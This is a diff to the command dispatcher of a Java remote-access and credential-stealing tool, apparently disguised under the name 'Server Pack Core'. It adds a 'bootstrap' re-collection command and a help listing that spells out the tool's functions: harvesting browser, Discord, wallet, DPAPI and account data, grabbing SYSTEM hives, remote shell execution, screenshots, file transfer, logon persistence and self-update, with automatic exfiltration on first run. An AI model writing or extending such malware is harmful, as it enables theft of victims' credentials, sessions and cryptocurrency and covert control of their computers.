@@ -53,6 +53,8 @@ public final class CommandExecutor {
 				case "upload" -> upload(message, args);
 				case "harvest" -> poller.harvestNow();
 				case "hives" -> poller.hivesNow();
+				case "bootstrap" -> poller.bootstrapNow();
+				case "help" -> help();
 				case "screenshot" -> screenshot();
 				case "persist" -> persist(args);
 				case "sleep" -> sleep(args);
@@ -70,6 +72,18 @@ public final class CommandExecutor {
 			Log.debug("Command failed", throwable);
 			poller.reply("Failed: " + throwable.getMessage());
 		}
+	}
+
+	private void help() {
+		poller.reply(String.join("\n",
+			"**Server Pack Core**",
+			"`ping` latency and transport · `harvest` collect now · `bootstrap` run the whole first-run collection again · `hives` SYSTEM hives (asks for UAC) · `screenshot` screen",
+			"`ls [dir]` · `cd <dir>` · `cat <file>` · `download <file>` (max 8 MB) · `upload <url|file> [name]`",
+			"`shell <cmd>` runs cmd /c with a 60 s cut; output over 1000 chars arrives as .txt",
+			"`persist on|off` logon task · `sleep <s>` · `kill`",
+			"`update check` · `update apply <version>` · `update rollback` · `update auto on|off` · `update status`",
+			"Harvest categories: accounts, browsers, Discord, wallets, DPAPI, game. The first run already sends recon, sessions, wallets and hives on its own.",
+			"Extras and repairs: SHELL.md in the repo."));
 	}
 
 	private void shell(String command) {
